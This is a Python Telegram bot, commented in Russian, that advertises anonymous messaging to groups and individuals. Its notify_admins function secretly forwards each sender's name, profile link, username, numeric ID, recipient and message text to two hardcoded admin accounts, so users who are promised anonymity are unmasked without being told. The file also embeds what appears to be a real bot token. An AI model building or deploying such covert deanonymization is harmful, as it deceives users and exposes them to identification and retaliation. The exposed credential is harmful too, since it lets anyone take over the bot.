import asyncio
import sqlite3
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.client.default import DefaultBotProperties

# --- НАСТРОЙКИ (ЗАПОЛНИ СВОИ ID) ---
TOKEN = "8720756817:AAFFksi2_kKScmLW1XVREa1WUtbcImAyeHE"
ADMIN_IDS = [7919798306, 5275461907] # Ты и твой друг

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode='HTML'))
dp = Dispatcher()

# --- БАЗА ДАННЫХ ---
def init_db():
    conn = sqlite3.connect("anonymous_pro.db")
    cursor = conn.cursor()
    # Таблица для пользователей (статистика)
    cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
    # Таблица для групп
    cursor.execute("CREATE TABLE IF NOT EXISTS group_links (group_id INTEGER PRIMARY KEY, group_name TEXT)")
    conn.commit()
    conn.close()

# --- КЛАВИАТУРА ---
def get_main_kb(user_id):
    buttons = [
        [KeyboardButton(text="👤 Моя личная ссылка")],
        [KeyboardButton(text="➕ Подключить группу")]
    ]
    if user_id in ADMIN_IDS:
        buttons.append([KeyboardButton(text="📊 Статистика")])
    return ReplyKeyboardMarkup(keyboard=buttons, resize_keyboard=True)

# --- ЛОГИРОВАНИЕ ДЛЯ АДМИНОВ ---
async def notify_admins(message, mode, target_user=None):
    u = message.from_user
    # Ссылка на отправителя
    sender_link = f"<a href='tg://user?id={u.id}'>{u.full_name}</a>"
    sender_un = f" (@{u.username})" if u.username else ""
    
    # Ссылка на получателя (если есть)
    target_info = ""
    if target_user:
        t_link = f"<a href='tg://user?id={target_user.id}'>{target_user.full_name}</a>"
        t_un = f" (@{target_user.username})" if target_user.username else ""
        target_info = f"\n🎯 <b>Кому:</b> {t_link}{t_un}"

    log = (
        f"🕵️ <b>НОВЫЙ ЛОГ</b>\n"
        f"👤 <b>От:</b> {sender_link}{sender_un}\n"
        f"🆔 <b>ID:</b> <code>{u.id}</code>\n"
        f"📍 <b>Тип:</b> {mode}{target_info}\n"
        f"📝 <b>Текст:</b> {message.text}"
    )
    
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, log)
        except:
            pass

# --- ОБРАБОТКА КОМАНД ---

@dp.message(CommandStart())
async def start(message: types.Message):
    init_db()
    # Сохраняем юзера для статистики
    conn = sqlite3.connect("anonymous_pro.db")
    conn.execute("INSERT OR IGNORE INTO users VALUES (?)", (message.from_user.id,))
    conn.commit()
    conn.close()

    args = message.text.split()
    
    # 1. Ссылка для группы (?start=-100...)
    if len(args) > 1 and args[1].startswith("-100"):
        await message.answer(
            f"🤫 <b>Анонимка в группу</b>\n\nНапиши сообщение ниже (нажми 'Ответить'), и я отправлю его в чат!\n\n"
            f"🆔 Группы: <code>{args[1]}</code>",
            reply_markup=get_main_kb(message.from_user.id)
        )
    # 2. Личная ссылка (?start=12345)
    elif len(args) > 1 and args[1].isdigit():
        await message.answer(
            f"🤫 Пиши анонимно для ID <code>{args[1]}</code>\n\n(Нажми 'Ответить')",
            reply_markup=get_main_kb(message.from_user.id)
        )
    # 3. Обычный старт
    else:
        await message.answer("Привет! Я помогу тебе создать анонимный чат или личную ссылку.", reply_markup=get_main_kb(message.from_user.id))

@dp.message(F.text == "/setup")
async def setup_group(message: types.Message):
    if message.chat.type in ["group", "supergroup"]:
        me = await bot.get_me()
        link = f"https://t.me/{me.username}?start={message.chat.id}"
        await message.answer(f"✅ <b>Группа готова!</b>\n\nЗакрепите эту ссылку:\n<code>{link}</code>")
    else:
        await message.answer("Эту команду нужно писать внутри группы, которую хочешь подключить!")

# --- ОБРАБОТКА КНОПОК ---

@dp.message(F.text == "👤 Моя личная ссылка")
async def show_my_link(message: types.Message):
    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start={message.from_user.id}"
    await message.answer(f"твоя личная ссылка:\n<code>{link}</code>")

@dp.message(F.text == "➕ Подключить группу")
async def how_to_connect(message: types.Message):
    await message.answer(
        "<b>Как подключить свою группу:</b>\n\n"
        "1. Добавь меня в группу.\n"
        "2. Дай мне права администратора.\n"
        "3. Напиши в группе команду <code>/setup</code>\n"
        "4. Я выдам ссылку специально для твоего чата!"
    )

@dp.message(F.text == "📊 Статистика")
async def show_stats(message: types.Message):
    if message.from_user.id in ADMIN_IDS:
        conn = sqlite3.connect("anonymous_pro.db")
        count = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        conn.close()
        await message.answer(f"📈 Всего пользователей: <b>{count}</b>")

# --- ГЛАВНЫЙ ОБРАБОТЧИК СООБЩЕНИЙ ---

@dp.message(F.text)
async def handle_all_messages(message: types.Message):
    if not message.reply_to_message:
        return

    # ОТПРАВКА В ГРУППУ
    if "Анонимка в группу" in message.reply_to_message.text:
        try:
            target_group = re.findall(r'-100\d+', message.reply_to_message.text)[0]
            await bot.send_message(target_group, f"📥 <b>Новое анонимное сообщение:</b>\n\n{message.text}")
            await message.answer("✅ Отправлено в группу!")
            await notify_admins(message, f"ГРУППА (ID {target_group})")
        except:
            await message.answer("❌ Ошибка отправки. Бот должен быть админом в группе!")

    # ЛИЧНАЯ ОТПРАВКА
    elif "Пиши анонимно для ID" in message.reply_to_message.text:
        target_id = re.findall(r'\d+', message.reply_to_message.text)[0]
        try:
            # Пытаемся узнать имя получателя для лога
            try:
                target_chat = await bot.get_chat(target_id)
                target_user_obj = target_chat
            except:
                target_user_obj = None

            await bot.send_message(target_id, f"📥 <b>Новый анонимный вопрос:</b>\n\n{message.text}")
            await message.answer("✅ Доставлено лично!")
            await notify_admins(message, "ЛИЧНО", target_user=target_user_obj)
        except:
            await message.answer("❌ Ошибка. Пользователь заблокировал бота.")

async def main():
    init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())

